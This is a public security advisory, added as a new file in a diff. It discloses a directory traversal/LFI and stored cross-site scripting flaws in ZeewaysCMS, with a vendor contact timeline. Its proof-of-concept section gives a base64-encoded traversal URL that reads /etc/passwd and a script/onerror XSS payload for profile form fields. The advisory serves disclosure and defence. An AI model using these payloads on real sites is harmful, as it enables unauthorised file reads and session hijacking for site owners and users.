@@ -1,0 +1,94 @@
+ZeewaysCMS Multiple Vulnerabilities
+
+
+[Software]
+
+- ZeewaysCMS
+
+
+[Vendor Product Description]
+
+- ZeewaysCMS is a Content Management System and a complete Web & Mobile Solution developed by Zeeways for Corporates, 
+Individuals or any kind of Business needs.
+
+
+- Site: http://www.zeewayscms.com/
+
+
+[Advisory Timeline]
+
+[25.03.2016] Vulnerability discovered.
+[25.03.2016] Vendor contacted.
+[29.03.2016] Follow up with the vendor.
+[29.03.2016] Vendor responded asking for details.
+[29.03.2016] Advisory and details sent to the vendor.
+[06.04.2016] Follow up with the vendor. No response received.
+[06.05.2016] Public security advisory released.
+
+
+[Bug Summary]
+
+- Directory Traversal
+
+- Cross Site Scripting (Stored)
+
+
+[Impact]
+
+- High
+
+
+[Affected Version]
+
+- Unknown
+
+
+[Tested on]
+
+- Apache/2.2.27
+- PHP/5.4.28
+
+
+[Advisory]
+
+- ID: ZSL-2016-5319
+- URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5319.php
+
+
+[Bug Description and Proof of Concept]
+
+- ZeewaysCMS suffers from a file inclusion vulnerability (LFI) when encoded input passed thru the 'targeturl' GET 
+parameter is not properly verified before being used to include files. This can be exploited to include files from 
+local resources with directory traversal attacks and URL encoded NULL bytes.
+https://en.wikipedia.org/wiki/Directory_traversal_attack
+
+- Multiple cross-site scripting vulnerabilities were also discovered. The issue is triggered when input passed 
+via multiple parameters is not properly sanitized before being returned to the user. This can be exploited to 
+execute arbitrary HTML and script code in a user's browser session in context of an affected site.
+https://en.wikipedia.org/wiki/Cross-site_scripting
+
+
+[Proof-of-Concept]
+
+1. Directory Traversal:
+
+http://localhost/demo//createPDF.php?targeturl=Ly4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2Q=&&pay_id=4&&type=actual
+Parameters: targeturl (GET)
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+2. Cross Site Scripting (Stored)
+
+http://localhost/demo/profile
+Parameters: screen_name, f_name, l_name, uc_email, uc_mobile, user_contact_num (POST)
+
+Payload(s):
+Content-Disposition: form-data; name="screen_name"
+
+"><script><<imgIMG SRC=oi onerror=JaVaScript:alert(1)>
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+All flaws described here were discovered and researched by:
+
+Bikramaditya Guha aka "PhoenixX"
